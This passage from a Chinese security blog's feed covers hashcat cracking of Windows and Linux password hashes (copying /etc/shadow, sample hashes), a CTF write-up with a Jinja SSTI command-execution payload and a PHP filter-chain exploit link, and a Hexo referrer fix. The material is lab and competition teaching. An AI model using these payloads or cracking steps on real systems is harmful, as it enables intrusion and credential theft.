id="掩码">掩码</h3><p>当没有字典的时候，可以使用掩码指定密码的每一位是什么类型的字符，首先我们知道密码有多少位<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323153207489-2145128247.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323153207489-2145128247.png" alt="img"></a><br>例如:<code>?d?d?d?d?d?d?d?d</code>代表密码为8为数字，<code>?u?l?l?l?l?d?d?d</code>代表密码为7位，首个字母大写，然后四个小写字母，最后三个数字</p><h3 id="破解windows-hash密码">破解windows hash密码</h3><p><strong>使用字典爆破windows hash</strong><br><code>hashcat64.exe -a 0 -m 1000 hash或者hashfile 字典文件</code><br>准备好我们的密码本，这里我使用的是手写的<code>2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152446755-1468474769.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152446755-1468474769.png" alt="img"></a><br><code>hashcat64.exe -a 0 -m 1000 e45a314c664d40a227f9540121d1a29d 2.txt</code><br>执行后会进入这样一个状态，这里每个可能不一样，在破解成功或者跑完字典后会自动停止<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152907726-1543846375.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152907726-1543846375.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152938264-999245190.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152938264-999245190.png" alt="img"></a><br>可以看到我们的密码已经被破解出来，为<code>Admin123</code><br>在破解后，会在根目录下的<code>hashcat.potfile</code>文件记录这个hash的缓存<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323154735555-892319052.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323154735555-892319052.png" alt="img"></a></p><p><strong>使用掩码破解windows hash</strong><br><code>hashcat64.exe -a 3 -m 1000 e45a314c664d40a227f9540121d1a29d ?u?l?l?l?l?d?d?d</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155148658-906395823.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155148658-906395823.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155209806-1669173198.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155209806-1669173198.png" alt="img"></a><br>破解成功</p><p>在我们爆破的同时，会有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</span><br></pre></td></tr></table></figure><p>分别：查看破解状态，暂停，绕过，检查，退出</p><p>还有如下例子：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118140015954.png" alt="image-20250118140015954"></p><h3 id="破解Linux-hash密码">破解Linux hash密码</h3><p>在<code>linux</code>中，我们知道，密码分别存储在/etc/passwd和/etc/shadow中，只需要<code>more /etc/shadow</code>，将其中的文件复制出来，使用工具破解即可<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323193627170-854468310.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323193627170-854468310.png" alt="img"></a><br>将root和jackson用户的密码保存到<code>/var/www/html/pass</code>Web服务目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$90/diajJs2fHcIGa$hB5wj4tMF8Qdd6o5VNRTY4v4vEpV8x0NP4O1N/tpJ8ns7JmJ8RyvSih7.W8TQdfwweUFh16dJejFpKw07i2uR1::0:99999:7:::</span><br><span class="line">jackson:$6$Zje1WaoS$eH24JFr5n67149yBcDWWsfxME5cYlOXMmJxnf2uinbvYm8vWc0BmjvAoXIFY/0ZUJItRpPhHkCGDiqjXT10EV0:19066:0:99999:7:::</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220324083051894-306061497.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220324083051894-306061497.png" alt="img"></a><br>注意这里的换行，一个用户的hash值是一行<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195519376-1688604181.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195519376-1688604181.png" alt="img"></a><br>启动Web服务<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195250088-790012495.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195250088-790012495.png" alt="img"></a><br>并在实验机器下载，这里使用certutil将pass文件内容下载到了D盘下的pass文件中去<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323194800417-621412828.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323194800417-621412828.png" alt="img"></a><br><strong>Linux使用的是 sha512crypt加密方式</strong>，在hashcat中寻找是否有该方法<br><code>hashcat64.exe -h|findstr sha512crypt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195736516-1164859720.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195736516-1164859720.png" alt="img"></a><br>代号为<code>1800</code><br>继续使用我们的<code>2.txt</code>对<code>d:\pass</code>文件进行暴力破解<br><code>hashcat64.exe -a 0 -m 1800 d:\pass 2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323200929852-624191296.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323200929852-624191296.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323201016538-1015617615.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323201016538-1015617615.png" alt="img"></a><br>这里我更换了<code>root</code>和<code>jackson</code>用户在文件中的位置<br>爆破成功，得到<code>jackson</code>的密码为<code>root</code>，但是只爆破出了一个密码，应该只支持一个密码的破解<br><strong><code>注意:复制的时候一定不要有换行，不然是无法破解成功的</code></strong></p>]]></content>
    
    
    <summary type="html">🥧hashcat常规使用方法</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://blog.m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.17</title>
    <link href="https://blog.m3x1.cn/posts/b245cfb0.html"/>
    <id>https://blog.m3x1.cn/posts/b245cfb0.html</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-02-19T11:00:12.845Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-flask">easy_flask</h4><blockquote><p>考点：ssti 注入</p></blockquote><p>打开网页，发现有个登录，试试直接登录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165333225.png" alt="image-20250117165333225"></p><p>看到 url 处是进行 get 传参，试试 111</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165407490.png" alt="image-20250117165407490"></p><p>联想到 ssti 漏洞，于是用9验证一下，发现就是 ssti 模板注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165456193.png" alt="image-20250117165456193"></p><p>进行 ssti 模板注入漏洞一系列，构造 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165555735.png" alt="image-20250117165555735"></p><blockquote><p>flag{48ad0cde8345c8b2608933ac4e85147e}</p></blockquote><h4 id="file-copy">file_copy</h4><blockquote><p>考点：无回显，filter协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230203872.png" alt="image-20250117230203872"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230233073.png" alt="image-20250117230233073"></p><p>根据代码，可以看到是post传参，参数是path。（抓包也可以看）</p><p>直接使用脚本（<a href="https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level%2017/php_filter_chains_oracle_exploit-main%EF%BC%89">https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level 17/php_filter_chains_oracle_exploit-main）</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230452787.png" alt="image-20250117230452787"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230507242.png" alt="image-20250117230507242"></p><blockquote><p>flag{894272cc-8e8d-47f7-9565-39636508492a}</p></blockquote><h2 id="Misc">Misc</h2><h4 id="简单算数">简单算数</h4><p>考点：异或</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165811554.png" alt="image-20250117165811554"></p><p>直接进行字符串异或，得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165855506.png" alt="image-20250117165855506"></p><blockquote><p>flag{x0r_Brute_is_easy!}</p></blockquote><h4 id="See-anything-in-these-pics">See anything in these pics</h4><blockquote><p>考点：文件分离</p></blockquote><p>解压后是一个二维码和一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170037763.png" alt="image-20250117170037763"></p><p>扫描二维码，得到解压缩包的密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170129000.png" alt="image-20250117170129000"></p><p>解压后得到一张 jpg 图片。先放进 010editor 看一下，发现隐藏了文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170256270.png" alt="image-20250117170256270"></p><p>用 binwalk 探测，然后提取，得到一张 png 图片</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170348138.png" alt="image-20250117170348138"></p><p>放进 010editor 查看，可能宽高被修改过，于是修改宽高得到原图</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170548575.png" alt="image-20250117170548575"></p><blockquote><p>flag{opium_00pium}</p></blockquote><h4 id="简单提取镜像">简单提取镜像</h4><blockquote><p>考点：流量分析，数据修复</p></blockquote><p>解压文件得到一个流量包，进行流量分析，导出文件，得到一个 zip 文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171207275.png" alt="image-20250117171207275"></p><p>解压 zip 文件，得到一个破损的 img 文件，根据提示，可能可以使用 RR-Studio 工具修复。</p><p>可以直接进行文件分离，得到一个 excl 表格，得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171347734.png" alt="image-20250117171347734"></p><blockquote><p>flag{E7A10C15E26AA5750070EF756AAA1F7C}</p></blockquote><h4 id="压力大，写个脚本吧">压力大，写个脚本吧</h4><blockquote><p>考点：脚本编写能力</p></blockquote><p><img src="E:/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/%E5%B7%A5%E5%85%B7/typora/Typora/upload/image-20250117171504745.png" alt="image-20250117171504745"></p><p>很明显是有密码的套娃压缩包，直接编写脚本解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import base64</span><br><span class="line">for i in range(99,0,-1):</span><br><span class="line">    i=str(i)</span><br><span class="line">    zipname = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\zip_&quot;+i+&quot;.zip&quot;</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    passwd = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    passwd = base64.b64decode(passwd)</span><br><span class="line">    print(passwd)</span><br><span class="line">    ts1 = zipfile.ZipFile(zipname,&#x27;r&#x27;)</span><br><span class="line">    ts1.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧&quot;,pwd=passwd)</span><br><span class="line">    ts1.close()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171704899.png" alt="image-20250117171704899"></p><p>提示是 png，然后我们将 password_0.txt 的密码进行 base64 解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89504E470D0A1A0A0000000D494844520000019000000190</span><br></pre></td></tr></table></figure><p>发现是个 png 文件头，所以这些密码应该组合在一起就是一张 png 图片。脚本直接放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">stringall = &quot;&quot;</span><br><span class="line">for i in range(0, 100):</span><br><span class="line">    i = str(i)</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    string = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    stringall += string</span><br><span class="line">print(base64.b64decode(stringall))</span><br></pre></td></tr></table></figure><p>得到一张二维码，直接扫，就得到了 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172005199.png" alt="image-20250117172005199"></p><blockquote><p>flag{<em>PASSWORDs_is_fl@g!</em>}</p></blockquote><h4 id="ez-forensics">ez_forensics</h4><blockquote><p>考点：镜像取证</p></blockquote><p>下载附件解压，先文件扫描一下看看，查找一下关键词</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134845419.png" alt="image-20250121134845419"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134909012.png" alt="image-20250121134909012"></p><p>将这两个文件（压缩包和txt）提取出来，发现压缩包解压需要密码。查看hint.txt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135038002.png" alt="image-20250121135038002"></p><p>60 = 13 +47，想到用rot13和rot47解密，得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135247193.png" alt="image-20250121135247193"></p><p>可以知道，压缩包的解压密码需要进行hashdump。</p><p>然后找到用户密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135742846.png" alt="image-20250121135742846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135722955.png" alt="image-20250121135722955"></p><p>解压后得到文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135900120.png" alt="image-20250121135900120"></p><p>结合提示搜索，发现了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140041681.png" alt="image-20250121140041681"></p><p>结合用户名，可以知道使用的试MobaXterm，所以ini文件是其配置文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140134279.png" alt="image-20250121140134279"></p><p>网上搜索其密码解密，找到一篇博客，知道可以使用脚本解密</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140432635.png" alt="image-20250121140432635"></p><p>master password就使用文件名 flag_is_here</p><p>最后解密得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140457763.png" alt="image-20250121140457763"></p><p>将flag内的内容进行base64解密得到flag。</p><blockquote><p>flag{you_are_a_g00d_guy}</p></blockquote><h2 id="crypto">crypto</h2><h4 id="通往哈希的旅程">通往哈希的旅程</h4><blockquote><p>考点：哈希</p></blockquote><p>根据提示得到一个哈希密文</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172603778.png" alt="image-20250117172603778"></p><p>直接哈希爆破或者在线解密得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172632734.png" alt="image-20250117172632734"></p><blockquote><p>flag{18876011645}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.17</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>解决hexo引入图床，手机和web不显示图片的问题</title>
    <link href="https://blog.m3x1.cn/posts/762268d0.html"/>
    <id>https://blog.m3x1.cn/posts/762268d0.html</id>
    <published>2024-11-30T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:12.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-前言">0.前言</h3><p>hexo引入图片的方式有很多种：</p><ul><li>从本地文件加载，方法参见参考文献一。</li><li>使用图床，markdown中直接引用图床的链接。</li></ul><h3 id="1-问题描述">1.问题描述</h3><p>Hexo使用图床的方式加载在blog中加载图片，会在非本人的电脑或者手机端报“html访问图片资源403问题(http referrer)”，导致采用图床方式加载的图片全部无法加载。</p><h3 id="2-问题原因">2.问题原因</h3><p>http请求体的header中有一个referrer字段，用来表示发起http请求的源地址信息，这个referrer信息是可以省略但是不可修改的，就是说你只能设置是否带上这个referrer信息，不能定制referrer里面的值。</p><p>服务器端在拿到这个referrer值后就可以进行相关的处理，比如图片资源，可以通过referrer值判断请求是否来自本站，若不是则返回403或者重定向返回其他信息，从而实现图片的防盗链。上面出现403就是因为，请求的是别人服务器上的资源，但把自己的referrer信息带过去了，被对方服务器拦截返回了403。</p><p>在前端可以通过meta来设置referrer policy(来源策略)，具体可以设置哪些值以及对应的结果参考<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTTP%2FHeaders%2FReferrer-Policy">这里</a>。所以针对上面的403情况的解决方法，就是把referrer设置成<code>no-referrer</code>，这样发送请求不会带上referrer信息，对方服务器也就无法拦截了。</p><p>浏览器中referrer默认的值是<code>no-referrer-when-downgrade</code>，就是除了降级请求的情况以外都会带上referrer信息。降级请求是指https协议的地址去请求http协议，所以上面403的情况还有另一种解决方法就是，请求的图片地址换成http协议，自己的地址使用http协议，这样降级请求也不会带上referrer。</p><h3 id="3-解决办法">3.解决办法</h3><h4 id="3-1-butterfly主题">3.1 butterfly主题</h4><p>在G:\blog\themes\butterfly\layout\includes目录下有一个head.pug文件，修改该文件的meta信息，会使生成的所有页面都带有该head。在head.pug文件中添加如下内容，结果参见图片。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">meta</span>(name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https:////upload-images.jianshu.io/upload_images/13838098-1b07689b2e132b5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/656/format/webp" alt="img"></p><p>butterfly添加头.png</p><h4 id="3-2-yilia主题">3.2 yilia主题</h4><p>在G:\blog\themes\yilia\layout_partial目录下有一个head.ejs，同样在head.ejs文件中添加如下meta信息即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="4-结果">4.结果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用hexo g 重新生成一下工程</span><br></pre></td></tr></table></figure><p>在G:\blog\public\2021目录下就是所有21年生成的blog，找到该目录下的任意一个index.html，用文本编辑器打开就可以看到已经自动生成了referrer标签了。</p><p><img src="https:////upload-images.jianshu.io/upload_images/13838098-34cdaee390f1a3dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/508/format/webp" alt="img"></p><p>生成的html中包含有referrer头.png</p><p>然后使用hexo d指令将工程同步到github即可</p>]]></content>
    
    
    <summary type="html">🥧解决hexo引入图床，手机和web不显示图片的问题</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
